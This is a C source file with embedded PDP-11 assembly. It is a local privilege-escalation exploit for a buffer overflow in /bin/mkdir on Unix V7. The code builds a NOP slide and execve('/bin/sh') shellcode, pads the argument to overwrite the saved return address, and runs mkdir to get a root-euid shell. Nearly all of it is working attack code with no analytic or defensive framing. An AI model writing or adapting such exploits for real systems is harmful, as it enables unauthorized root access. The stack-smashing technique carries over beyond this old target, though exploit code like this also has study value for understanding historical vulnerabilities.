/*
 * Exploit for /bin/mkdir Unix V7 PDP-11.
 * mkdir has a buffer overflow when checking if the directory
 * in /arg/with/slashes/fname exists.
 *
 * This will run /bin/sh with euid 0, but not uid 0.  Since
 * the shell doesn't do anything special about this, we don't
 * really care.  If you care, run  setuid(0); execl("/bin/sh", 0);
 */

/*
.globl  _main
_main:
    mov  pc,r1
    sub  $-[sh-_main-2], r1             / pointer to sh
    mov  r1, r2
    sub  $-8, r2
    clrb -1(r2)                         / null terminate
    mov  r1, r2
    clr  -(r1)                          / char *env[] = {0}
    mov  r1, r3
    mov  r2, -(r1)                      / char *argv[] = {sh, 0}
    mov  r1, r4
    mov  r3, -(r1)                      / reverse of sh,argv,env
    mov  r4, -(r1)
    mov  r2, -(r1)
    sys  59.; 11111; 11111; 11111       / call execve
argv:   11111; 11111
sh:     </bin/sh>
*/

char egg[] = { 0301, 021, 0301, 0345, 0326, 0377, 0102, 020,
    0302, 0345, 0370, 0377, 062, 0212, 0377, 0377,
    0102, 020, 041, 012, 0103, 020, 0241, 020,
    0104, 020, 0341, 020, 041, 021, 0241, 020,
    073, 0211, 0111, 022, 0111, 022, 0111, 022,
    0111, 022, 0111, 022, 057, 0142, 0151, 0156,
    057, 0163, 0150, 0 };

#define NOPSLIDE 50
#define CNT 136
#define PC 0xfea0

main(argc, argv)
    int argc;
    char **argv;
{
    char buf[400];
    int i;
    char *argv2[4];

    /* nop slide + egg */
    for(i = 0; i < NOPSLIDE; ) {
        buf[i++] = 0301;
        buf[i++] = 021;
    }
    strcpy(buf + i, egg);

    /* pad out to CNT */
    for(i = strlen(buf); i < CNT; i++)
        buf[i] = 'a';

    /* overwrite retaddr */
    buf[i++] = PC & 0xff;
    buf[i++] = PC >> 8;

    /* extra stuff */
    buf[i++] = '/';
    buf[i++] = 'a';
    buf[i++] = 0;

    argv2[0] = "/bin/mkdir";
    argv2[1] = buf;
    argv2[2] = 0;
    execv(argv2[0], argv2);
    return 0;
}